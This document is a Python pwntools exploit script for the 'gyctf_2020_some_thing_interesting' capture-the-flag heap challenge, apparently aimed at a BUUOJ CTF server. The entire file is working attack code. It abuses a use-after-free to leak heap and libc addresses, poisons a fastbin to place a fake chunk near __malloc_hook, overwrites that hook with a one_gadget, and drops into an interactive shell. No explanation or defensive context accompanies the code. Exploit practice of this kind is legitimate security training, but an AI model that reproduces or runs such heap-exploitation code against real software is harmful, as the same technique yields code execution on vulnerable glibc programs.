from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('gyctf_2020_some_thing_interesting')
io = remote('node4.buuoj.cn', 26408)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('gyctf_2020_some_thing_interesting')


def add(size1, content1, size2, content2):
    io.sendlineafter('> Now please tell me what you want to do :', '1')
    io.sendlineafter('> O\'s length : ', str(size1))
    io.sendafter('> O : ', content1)
    io.sendlineafter('> RE\'s length : ', str(size2))
    io.sendafter('> RE : ', content2)


def edit(id, content1, content2):
    io.sendlineafter('> Now please tell me what you want to do :', '2')
    io.sendlineafter('> Oreo ID : ', str(id))
    io.sendafter('> O : ', content1)
    io.sendafter('> RE : ', content2)



def delete(id):
    io.sendlineafter('> Now please tell me what you want to do :', '3')
    io.sendlineafter('> Oreo ID : ', str(id))


def show(id):
    io.sendlineafter('> Now please tell me what you want to do :', '4')
    io.sendlineafter('> Oreo ID : ', str(id))


def leak_libc():
    global heap_base, libc_base
    # chunk0 0x70 chunk1 0x60
    add(0x68, cyclic(0x58) + p64(0x61), 0x58, cyclic(0x58))
    # chunk2 0x70 chunk3 0x60
    add(0x68, cyclic(0x68), 0x58, cyclic(0x58))
    delete(1)
    delete(2)
    show(2)
    io.recvuntil('# oreo\'s RE is ')
    heap_base = u64(io.recvn(6).ljust(8, b'\x00')) - 0x70
    log.success('heap_base: ' + hex(heap_base))
    edit(2, p64(heap_base), p64(heap_base + 0x60))
    # chunk3 0x60 fake_chunk(chunk1-0x10) 0x60
    add(0x58, cyclic(0x58), 0x58, p64(0) + p64(0xd1))
    delete(1)
    show(1)
    io.recvuntil('# oreo\'s RE is ')
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))
    

def pwn():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    # one_gadget = libc_base + 0xf1247
    one_gadget = libc_base + 0xf1147
    edit(1, p64(__malloc_hook - 0x23), cyclic(0x58))
    # chunk0 0x70 fake_chunk(__malloc_hook - 0x23) 0x70
    add(0x68, cyclic(0x68), 0x68, cyclic(0x13) + p64(one_gadget))
    # gdb.attach(io)
    # pause()
    io.sendlineafter('> Now please tell me what you want to do :', '1')
    io.sendlineafter('> O\'s length : ', '1')
    io.interactive()


if __name__ == '__main__':
    io.sendlineafter('> Input your code please:', 'OreOOrereOOreO')
    leak_libc()
    pwn()
